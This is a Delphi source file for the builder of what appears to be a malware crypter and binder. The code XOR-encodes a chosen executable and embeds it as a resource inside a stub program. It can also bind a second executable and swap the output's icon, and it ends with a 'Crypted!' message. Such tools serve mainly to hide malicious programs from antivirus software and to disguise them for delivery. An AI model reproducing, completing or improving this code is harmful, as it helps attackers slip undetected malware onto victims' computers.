unit uBuilder;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, pngimage, ExtCtrls, XPMan, StdCtrls, uResources, uIcon;

type
  TForm1 = class(TForm)
    XPManifest1: TXPManifest;
    GroupBox1: TGroupBox;
    EdtCrypter: TEdit;
    Label1: TLabel;
    BtnCrypter: TButton;
    BtnBinder: TButton;
    EdtBinder: TEdit;
    BtnStub: TButton;
    EdtStub: TEdit;
    Label3: TLabel;
    GroupBox2: TGroupBox;
    BtnIcon: TButton;
    EdtIcon: TEdit;
    BtnBuild: TButton;
    BtnAbout: TButton;
    ChkBinder: TCheckBox;
    ChkIcon: TCheckBox;
    OpenExe: TOpenDialog;
    SaveExe: TSaveDialog;
    OpenIcon: TOpenDialog;
    procedure BtnCrypterClick(Sender: TObject);
    procedure BtnStubClick(Sender: TObject);
    procedure BtnBinderClick(Sender: TObject);
    procedure BtnBuildClick(Sender: TObject);
    procedure BtnIconClick(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

function ReadFile(FileName: String): AnsiString;
var
  F             :File;
  Buffer        :AnsiString;
  Size          :Integer;
  ReadBytes     :Integer;
  DefaultFileMode:Byte;
begin
  Result := '';
  DefaultFileMode := FileMode;
  FileMode := 0;
  AssignFile(F, FileName);
  Reset(F, 1);

  if (IOResult = 0) then
  begin
    Size := FileSize(F);
    while (Size > 1024) do
    begin
      SetLength(Buffer, 1024);
      BlockRead(F, Buffer[1], 1024, ReadBytes);
      Result := Result + Buffer;
      Dec(Size, ReadBytes);
    end;
    SetLength(Buffer, Size);
    BlockRead(F, Buffer[1], Size);
    Result := Result + Buffer;
    CloseFile(F);
  end;

  FileMode := DefaultFileMode;
end;

procedure XorString(var Buffer :String; Key :Integer);
var
  i :Integer;
begin
  for i := 1 to Length(Buffer) do
  begin
    Buffer[i] := char((Integer(Buffer[i]) xor Key) + Key);
  end;
end;

procedure TForm1.BtnCrypterClick(Sender: TObject);
begin
  if OpenExe.Execute then
    EdtCrypter.Text := OpenExe.FileName;
end;

procedure TForm1.BtnStubClick(Sender: TObject);
begin
  if OpenExe.Execute then
    EdtStub.Text := OpenExe.FileName;
end;

procedure TForm1.BtnBinderClick(Sender: TObject);
begin
  if OpenExe.Execute then
    EdtBinder.Text := OpenExe.FileName;
end;

procedure TForm1.BtnBuildClick(Sender: TObject);
var
  FileInMemory :String;
begin
  if not SaveExe.Execute then
    Exit;

  FileInMemory := ReadFile(EdtCrypter.Text);
  //FileInMemory := Copy(FileInMemory, 1, 5000);
  XorString(FileInMemory, 65);
  CopyFile(PChar(EdtStub.Text), PChar(SaveExe.FileName), false);
  InsertRes(SaveExe.FileName, RT_RCDATA, '1', FileInMemory);

  if ChkBinder.Checked then
  begin
    FileInMemory := ReadFile(EdtBinder.Text);
    XorString(FileInMemory, 65);
    InsertRes(SaveExe.FileName, RT_RCDATA, '2', FileInMemory);
  end;

  if ChkIcon.Checked then
    LoadExeIcon(SaveExe.FileName, EdtIcon.Text);

  MessageBox(0, 'Crypted!', 'Information', 64);
end;

procedure TForm1.BtnIconClick(Sender: TObject);
begin
  if OpenIcon.Execute then
    EdtIcon.Text := OpenIcon.FileName;
end;

end.
